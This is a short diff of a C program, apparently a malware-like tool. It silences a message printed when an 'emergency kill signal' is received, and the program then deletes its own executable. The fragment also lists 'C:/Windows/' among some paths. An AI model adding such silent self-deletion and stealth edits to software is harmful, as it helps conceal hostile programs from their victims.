@@ -52,7 +52,7 @@ int go(int argc, char *argv[]){
         "C:/Windows/",
     };
     if (isKill() == TRUE){
-        printf("Received emergency kill signal!\n");
+        //printf("Received emergency kill signal!\n");
         remove(argv[0]);
         return 1;
     }
